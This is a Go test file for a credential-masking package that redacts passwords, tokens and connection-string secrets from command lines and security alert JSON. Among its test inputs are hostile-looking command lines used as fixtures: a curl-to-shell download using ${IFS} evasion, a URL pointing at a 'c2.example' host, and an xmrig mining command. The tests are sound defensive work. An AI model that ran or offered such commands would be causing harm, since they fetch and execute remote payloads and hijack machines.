package sanitize

import (
	"strings"
	"testing"
)

func TestCmdline(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"空字符串", "", ""},
		{"普通命令", "ls -la /tmp", "ls -la /tmp"},
		{"无敏感参数", "curl https://example.com", "curl https://example.com"},

		// --flag=value 模式
		{"password=value", "mysql --password=secret123 -u root", "mysql --password=*** -u root"},
		{"token=value", "curl --token=abc123def456", "curl --token=***"},
		{"secret=value", "app --secret=mysecret --port=8080", "app --secret=*** --port=8080"},
		{"api-key=value", "cli --api-key=ak_live_xxx", "cli --api-key=***"},
		{"api_key=value", "cli --api_key=ak_live_xxx", "cli --api_key=***"},

		// -flag value 模式
		{"password空格", "mysql -password secret123 -u root", "mysql -password *** -u root"},
		{"-p空格", "mysql -pass secret123", "mysql -pass ***"},

		// 大小写不敏感
		{"大写", "app --PASSWORD=abc", "app --PASSWORD=***"},
		{"混合大小写", "app --Token=abc", "app --Token=***"},

		// 环境变量泄漏
		{"env PASSWORD=", "PASSWORD=secret123 ./app", "PASSWORD=*** ./app"},
		{"env AWS_SECRET_ACCESS_KEY=", "AWS_SECRET_ACCESS_KEY=abcdef /bin/aws", "AWS_SECRET_ACCESS_KEY=*** /bin/aws"},
		{"env API_KEY=", "API_KEY=xxx ./start.sh", "API_KEY=*** ./start.sh"},

		// 多个敏感参数
		{"多个参数", "app --password=p1 --token=t1 --port=80", "app --password=*** --token=*** --port=80"},

		// 正常参数不受影响
		{"port不脱敏", "app --port=8080", "app --port=8080"},
		{"host不脱敏", "mysql --host=localhost --password=secret", "mysql --host=localhost --password=***"},

		// 挖矿进程不受影响
		{"挖矿命令行", "/tmp/xmrig --pool stratum+tcp://pool.com:3333 --user wallet", "/tmp/xmrig --pool stratum+tcp://pool.com:3333 --user wallet"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Cmdline(tt.input)
			if got != tt.want {
				t.Errorf("Cmdline(%q)\n  got:  %q\n  want: %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestFields(t *testing.T) {
	fields := map[string]string{
		"exe":     "/usr/bin/mysql",
		"cmdline": "mysql --password=secret -u root",
		"pid":     "1234",
	}

	Fields(fields)

	if fields["cmdline"] != "mysql --password=*** -u root" {
		t.Errorf("Fields 未正确脱敏 cmdline: %q", fields["cmdline"])
	}
	if fields["exe"] != "/usr/bin/mysql" {
		t.Error("Fields 不应修改 exe")
	}
}

func TestFieldsNoCmdline(t *testing.T) {
	fields := map[string]string{
		"exe": "/bin/bash",
		"pid": "100",
	}
	Fields(fields)
	// 不含 cmdline，不应 panic
	if fields["exe"] != "/bin/bash" {
		t.Error("不应修改 exe")
	}
}

func BenchmarkCmdline(b *testing.B) {
	input := "app --password=secret123 --token=abc --port=8080 --host=localhost" // leakscan:example
	for b.Loop() {
		Cmdline(input)
	}
}

// 常见但原规则漏掉的写法：mysql 一族的 -p 紧跟口令、redis-cli -a、带前缀的环境变量、连接串。
// 同一个短参数在别的程序里意思不同，只在对应程序出现时处理；这里同时钉住不该遮的。
func TestCmdlineShortFlagsAndURLs(t *testing.T) {
	tests := []struct{ name, input, want string }{
		{"mysql -p紧跟口令", "mysql -h 10.0.0.5 -P3306 -uroot -pS3cret", "mysql -h 10.0.0.5 -P3306 -uroot -p***"},
		{"mysql 完整路径", "/usr/local/mysql/bin/mysql -uroot -pS3cret -P3306 -h 10.0.0.6", "/usr/local/mysql/bin/mysql -uroot -p*** -P3306 -h 10.0.0.6"},
		{"mysqldump 在 sh -c 里", "sh -c 'mysqldump -uroot -pS3cret db > /tmp/x.sql'", "sh -c 'mysqldump -uroot -p*** db > /tmp/x.sql'"},
		{"mysql 交互式 -p 不动", "mysql -uroot -p -h db", "mysql -uroot -p -h db"},
		{"ssh -p 端口不动", "ssh -p 2222 root@10.0.0.7", "ssh -p 2222 root@10.0.0.7"},
		{"redis-cli -a", "redis-cli -h 127.0.0.1 -p 6379 -a S3cret info", "redis-cli -h 127.0.0.1 -p 6379 -a *** info"},
		{"别的程序的 -a 不动", "tar -a -cf x.tgz dir", "tar -a -cf x.tgz dir"},
		{"sshpass", "sshpass -p S3cret scp f host:/tmp", "sshpass -p *** scp f host:/tmp"},
		{"PGPASSWORD", "PGPASSWORD=S3cret psql -h db", "PGPASSWORD=*** psql -h db"},
		{"MYSQL_PWD", "MYSQL_PWD=S3cret mysql -uroot", "MYSQL_PWD=*** mysql -uroot"},
		{"sudo 日志的 PWD 是目录", "alice : PWD=/home/alice ; USER=root ; COMMAND=/bin/true", "alice : PWD=/home/alice ; USER=root ; COMMAND=/bin/true"},
		{"连接串", "app --dsn mysql://app:S3cret@db:3306/x", "app --dsn mysql://app:***@db:3306/x"},
		{"路径里的冒号不是口令", "curl http://host/a?b=c:d@e", "curl http://host/a?b=c:d@e"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Cmdline(tt.input); got != tt.want {
				t.Errorf("Cmdline(%q)\n  got:  %q\n  want: %q", tt.input, got, tt.want)
			}
		})
	}
}

// 入侵检测类告警把命令行放在 content，认证事件放在 command，都要遮。
func TestFieldsCoversCommandFields(t *testing.T) {
	f := map[string]string{
		"cmdline": "mysql -uroot -pA1", "content": "sh -c 'redis-cli -a B2 ping'",
		"command": "PGPASSWORD=C3 psql", "parent_cmdline": "sshpass -p D4 ssh h", "exe": "/usr/bin/mysql",
	}
	Fields(f)
	for k, v := range f {
		for _, secret := range []string{"A1", "B2", "C3", "D4"} {
			if strings.Contains(v, secret) {
				t.Errorf("%s 仍含口令: %q", k, v)
			}
		}
	}
	if f["exe"] != "/usr/bin/mysql" {
		t.Errorf("非命令行字段不该动: %q", f["exe"])
	}
}

// 审查报出的写法：引号包住的口令、空用户名的 redis 连接串、口令里带 / 与 @。
func TestCmdlineQuotedAndURLVariants(t *testing.T) {
	tests := []struct{ name, input, want string }{
		{"cron 里 -p 单引号", "/bin/sh -c mysqldump -uroot -p'S3cret' db > /bk/db.sql", "/bin/sh -c mysqldump -uroot -p*** db > /bk/db.sql"},
		{"bash -c 里 -p 双引号", `bash -c 'mysql -uroot -p"S3cret" db'`, `bash -c 'mysql -uroot -p*** db'`},
		{"redis-cli -a 带引号", `bash -c "redis-cli -h 10.0.0.1 -a 'S3cret' config get dir"`, `bash -c "redis-cli -h 10.0.0.1 -a *** config get dir"`},
		{"sshpass -p 带引号", "sshpass -p 'S3cret' ssh h", "sshpass -p *** ssh h"},
		{"sshpass -p 紧跟引号", `sshpass -p"S3cret" ssh h`, "sshpass -p *** ssh h"},
		{"redis 空用户名", "redis-cli -u redis://:S3cret@127.0.0.1:6379", "redis-cli -u redis://:***@127.0.0.1:6379"},
		{"连接串口令含斜杠", "app mysql://app:Ab/9+xQ@db:3306/x", "app mysql://app:***@db:3306/x"},
		{"连接串口令含 @", "app postgresql://u:S3c@ret@db/x", "app postgresql://u:***@db/x"},
		{"端口加路径不是口令", "curl https://host:8443/a@b", "curl https://host:8443/a@b"},
		{"引号里带空格的环境变量", "PGPASSWORD='S3 cret' psql", "PGPASSWORD=*** psql"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Cmdline(tt.input); got != tt.want {
				t.Errorf("Cmdline(%q)\n  got:  %q\n  want: %q", tt.input, got, tt.want)
			}
		})
	}
}

// 不能误伤：程序规则只在该程序那段命令里生效；值在 ; | & 处截断，不能把后面的载荷一起抹掉。
func TestCmdlineDoesNotOvermask(t *testing.T) {
	tests := []struct{ name, input, want string }{
		{"路径里的 mysql 不是程序", "cp -pR /var/lib/mysql /backup", "cp -pR /var/lib/mysql /backup"},
		{"find -perm", "find /var/lib/mysql -perm 4000", "find /var/lib/mysql -perm 4000"},
		{"find -print", "find /var/lib/mysql -name '*.ibd' -print", "find /var/lib/mysql -name '*.ibd' -print"},
		{"另一段命令的 ssh 端口", "systemctl stop mysql && ssh -p2222 bk@h", "systemctl stop mysql && ssh -p2222 bk@h"},
		{"mysql 段之后的 ssh 不动", "mysql -uroot -pS3cret -e x; ssh -p2222 h", "mysql -uroot -p*** -e x; ssh -p2222 h"},
		{"环境变量不吞后续载荷", "X_TOKEN=1;curl${IFS}http://1.2.3.4/m.sh|sh", "X_TOKEN=***;curl${IFS}http://1.2.3.4/m.sh|sh"},
		{"查询串 token 截到 &", "curl -s http://1.2.3.4/i?token=1&u=http://c2.example/x.sh", "curl -s http://1.2.3.4/i?token=***&u=http://c2.example/x.sh"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Cmdline(tt.input); got != tt.want {
				t.Errorf("Cmdline(%q)\n  got:  %q\n  want: %q", tt.input, got, tt.want)
			}
		})
	}
}

// 告警详情是任意 JSON：数字、数组、嵌套对象里的命令行字段都要遮，数字原样保留。
func TestJSONSanitizesNestedPayload(t *testing.T) {
	raw := []byte(`{"pid":4242,"uid":0,"categories":["ld_preload"],"content":"sh -c 'mysql -uroot -pS3cret'",` +
		`"would_action":{"reason":"x","cmdline":"redis-cli -a S3cret ping"},"events":[{"command":"PGPASSWORD=S3cret psql"}]}`)
	out, ok := JSON(raw)
	if !ok {
		t.Fatal("合法 JSON 应能处理")
	}
	if strings.Contains(string(out), "S3cret") {
		t.Fatalf("仍含口令: %s", out)
	}
	if !strings.Contains(string(out), `"pid":4242`) || !strings.Contains(string(out), `"categories":["ld_preload"]`) {
		t.Fatalf("其它字段被改动: %s", out)
	}
	if _, ok := JSON([]byte("not json")); ok {
		t.Fatal("非法 JSON 应返回 ok=false")
	}
}

// 复核报出的写法：包装命令、纯数字口令、引号里的分隔符、sshpass 后面 ssh 的端口。
func TestCmdlineWrappersAndQuotedSeparators(t *testing.T) {
	tests := []struct{ name, input, want string }{
		{"docker exec", "docker exec db mysql -uroot -pS3cret", "docker exec db mysql -uroot -p***"},
		{"docker exec redis", "docker exec redis redis-cli -a S3cret info", "docker exec redis redis-cli -a *** info"},
		{"kubectl exec", "kubectl exec -it db -- mysql -uroot -pS3cret", "kubectl exec -it db -- mysql -uroot -p***"},
		{"sudo -u", "sudo -u root mysql -uroot -pS3cret", "sudo -u root mysql -uroot -p***"},
		{"ssh 远程执行", "ssh db1 mysql -uroot -pS3cret -e x", "ssh db1 mysql -uroot -p*** -e x"},
		{"watch", "watch redis-cli -a S3cret info", "watch redis-cli -a *** info"},
		{"nice", "nice -n 5 mysqldump -uroot -pS3cret db", "nice -n 5 mysqldump -uroot -p*** db"},
		{"/usr/bin/env", "/usr/bin/env mysql -uroot -pS3cret", "/usr/bin/env mysql -uroot -p***"},
		{"bash -lc", "bash -lc mysql -uroot -pS3cret", "bash -lc mysql -uroot -p***"},
		{"sudo 日志 COMMAND=", "alice : PWD=/root ; USER=root ; COMMAND=/usr/bin/mysql -uroot -pS3cret", "alice : PWD=/root ; USER=root ; COMMAND=/usr/bin/mysql -uroot -p***"},
		{"连接串纯数字口令", "app mysql://root:123456@db/x", "app mysql://root:***@db/x"},
		{"redis 纯数字口令", "redis-cli -u redis://:123456@10.0.0.1:6379", "redis-cli -u redis://:***@10.0.0.1:6379"},
		{"引号里的分号", "mysql -uroot -p'a;b' db", "mysql -uroot -p*** db"},
		{"-e 引号里的分号在口令之前", `mysql -h h -e "use db; show tables" -pS3cret`, `mysql -h h -e "use db; show tables" -p***`},
		{"sh -c 外层引号后的 ssh 端口", "bash -c 'mysql -uroot -pS3cret'; ssh -p2222 h", "bash -c 'mysql -uroot -p***'; ssh -p2222 h"},
		{"sshpass 后 ssh 端口不动", "sshpass -p S3cret ssh -p 2222 h", "sshpass -p *** ssh -p 2222 h"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Cmdline(tt.input); got != tt.want {
				t.Errorf("Cmdline(%q)\n  got:  %q\n  want: %q", tt.input, got, tt.want)
			}
		})
	}
}

// 第三轮复核：程序不在 bin 目录、日志原文里的转义引号、未闭合的引号。
func TestCmdlinePathsEscapesAndUnclosedQuotes(t *testing.T) {
	tests := []struct{ name, input, want string }{
		{"./mysql", "./mysql -uroot -pS3cret", "./mysql -uroot -p***"},
		{"非 bin 目录", "/usr/local/mysql/mysql -uroot -pS3cret", "/usr/local/mysql/mysql -uroot -p***"},
		{"临时目录投放", "/tmp/.x/mysqldump -uroot -pS3cret db", "/tmp/.x/mysqldump -uroot -p*** db"},
		{"转义引号", `sh -c "mysql -e \"select 1; \" -pS3cret"`, `sh -c "mysql -e \"select 1; \" -p***"`},
		{"未闭合引号按分隔符截断", `mysql -uroot -pA "unterminated ; ssh -p2222 h`, `mysql -uroot -p*** "unterminated ; ssh -p2222 h`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Cmdline(tt.input); got != tt.want {
				t.Errorf("Cmdline(%q)\n  got:  %q\n  want: %q", tt.input, got, tt.want)
			}
		})
	}
}
